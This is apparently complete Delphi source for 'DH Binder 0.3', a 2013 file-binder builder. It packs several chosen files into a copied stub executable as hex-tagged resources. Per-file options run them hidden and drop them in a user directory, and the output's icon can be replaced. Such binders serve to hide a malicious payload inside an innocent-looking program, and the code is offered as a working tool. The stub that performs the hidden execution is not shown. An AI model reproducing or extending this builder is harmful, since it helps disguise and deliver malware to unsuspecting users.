// DH Binder 0.3
// (C) Doddy Hackman 2013
// Credits :
// Joiner Based in : "Ex Binder v0.1" by TM
// Icon Changer based in : "IconChanger" By Chokstyle
// Thanks to TM & Chokstyle

unit dhbinde;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, sSkinManager, acPNG, ExtCtrls, ComCtrls, sListView, sStatusBar,
  StdCtrls, sGroupBox, sButton, sComboBox, sCheckBox, Menus, sEdit, madRes;

type
  TForm1 = class(TForm)
    sSkinManager1: TsSkinManager;
    Image1: TImage;
    sGroupBox1: TsGroupBox;
    sStatusBar1: TsStatusBar;
    sListView1: TsListView;
    sGroupBox2: TsGroupBox;
    sGroupBox3: TsGroupBox;
    Image2: TImage;
    sButton1: TsButton;
    sGroupBox4: TsGroupBox;
    sComboBox1: TsComboBox;
    sGroupBox5: TsGroupBox;
    sCheckBox1: TsCheckBox;
    sGroupBox6: TsGroupBox;
    sButton2: TsButton;
    sButton3: TsButton;
    sButton4: TsButton;
    PopupMenu1: TPopupMenu;
    l1: TMenuItem;
    OpenDialog1: TOpenDialog;
    OpenDialog2: TOpenDialog;
    sEdit1: TsEdit;
    C1: TMenuItem;
    procedure l1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure sButton1Click(Sender: TObject);
    procedure sButton2Click(Sender: TObject);
    procedure sButton3Click(Sender: TObject);
    procedure sButton4Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

uses about;
{$R *.dfm}
// Functions

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

//

procedure TForm1.C1Click(Sender: TObject);
begin
  sListView1.Items.Clear;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin

  sSkinManager1.SkinDirectory := ExtractFilePath(Application.ExeName) + 'Data';
  sSkinManager1.SkinName := 'tv-b';
  sSkinManager1.Active := True;

  OpenDialog1.InitialDir := GetCurrentDir;
  OpenDialog2.InitialDir := GetCurrentDir;
  OpenDialog2.Filter := 'ICO|*.ico|';

end;

procedure TForm1.l1Click(Sender: TObject);
var
  op: String;
begin

  if OpenDialog1.Execute then
  begin

    op := InputBox('Add File', 'Execute Hide ?', 'Yes');

    with sListView1.Items.Add do
    begin
      Caption := ExtractFileName(OpenDialog1.FileName);
      if (op = 'Yes') then
      begin
        SubItems.Add(OpenDialog1.FileName);
        SubItems.Add('Hide');
      end
      else
      begin
        SubItems.Add(OpenDialog1.FileName);
        SubItems.Add('Normal');
      end;
    end;

  end;
end;

procedure TForm1.sButton1Click(Sender: TObject);
begin

  if OpenDialog2.Execute then
  begin
    Image2.Picture.LoadFromFile(OpenDialog2.FileName);
    sEdit1.Text := OpenDialog2.FileName;
  end;

end;

procedure TForm1.sButton2Click(Sender: TObject);
var
  i: integer;
  nombre: string;
  ruta: string;
  tipo: string;
  savein: string;
  opcionocultar: string;
  lineafinal: string;
  uno: DWORD;
  tam: DWORD;
  dos: DWORD;
  tres: DWORD;
  todo: Pointer;
  change: DWORD;
  valor: string;
  stubgenerado: string;

begin

  if (sListView1.Items.Count = 0) or (sListView1.Items.Count = 1) then
  begin
    ShowMessage('You have to choose two or more files');
  end
  else
  begin
    stubgenerado := 'done.exe';

    if (sCheckBox1.Checked = True) then
    begin
      opcionocultar := '1';
    end
    else
    begin
      opcionocultar := '0';
    end;

    if (sComboBox1.Items[sComboBox1.ItemIndex] = '') then
    begin
      savein := 'USERPROFILE';
    end
    else
    begin
      savein := sComboBox1.Items[sComboBox1.ItemIndex];
    end;

    DeleteFile(stubgenerado);
    CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' + 'Data/stub.exe')
        , PChar(ExtractFilePath(Application.ExeName) + '/' + stubgenerado),
      True);

    uno := BeginUpdateResource
      (PChar(ExtractFilePath(Application.ExeName) + '/' + stubgenerado), True);

    for i := 0 to sListView1.Items.Count - 1 do
    begin

      nombre := sListView1.Items[i].Caption;
      ruta := sListView1.Items[i].SubItems[0];
      tipo := sListView1.Items[i].SubItems[1];

      lineafinal := '[nombre]' + nombre + '[nombre][tipo]' + tipo +
        '[tipo][dir]' + savein + '[dir][hide]' + opcionocultar + '[hide]';
      lineafinal := '[63686175]' + dhencode(UpperCase(lineafinal), 'encode')
        + '[63686175]';

      dos := CreateFile(PChar(ruta), GENERIC_READ, FILE_SHARE_READ, nil,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
      tam := GetFileSize(dos, nil);
      GetMem(todo, tam);
      ReadFile(dos, todo^, tam, tres, nil);
      CloseHandle(dos);
      UpdateResource(uno, RT_RCDATA, PChar(lineafinal), MAKEWord(LANG_NEUTRAL,
          SUBLANG_NEUTRAL), todo, tam);

    end;

    EndUpdateResource(uno, False);

    if not(sEdit1.Text = '') then
    begin
      try
        begin
          change := BeginUpdateResourceW
            (PWideChar(wideString(ExtractFilePath(Application.ExeName)
                  + '/' + stubgenerado)), False);
          LoadIconGroupResourceW(change, PWideChar(wideString(valor)), 0,
            PWideChar(wideString(sEdit1.Text)));
          EndUpdateResourceW(change, False);
          sStatusBar1.Panels[0].Text := '[+] Done ';
          Form1.sStatusBar1.Update;
        end;
      except
        begin
          sStatusBar1.Panels[0].Text := '[-] Error';
          Form1.sStatusBar1.Update;
        end;
      end;
    end
    else
    begin
      sStatusBar1.Panels[0].Text := '[+] Done ';
      Form1.sStatusBar1.Update;
    end;
  end;

end;

procedure TForm1.sButton3Click(Sender: TObject);
begin
  Form2.Show;
end;

procedure TForm1.sButton4Click(Sender: TObject);
begin
  Form1.Close();
end;

end.

// The End ?
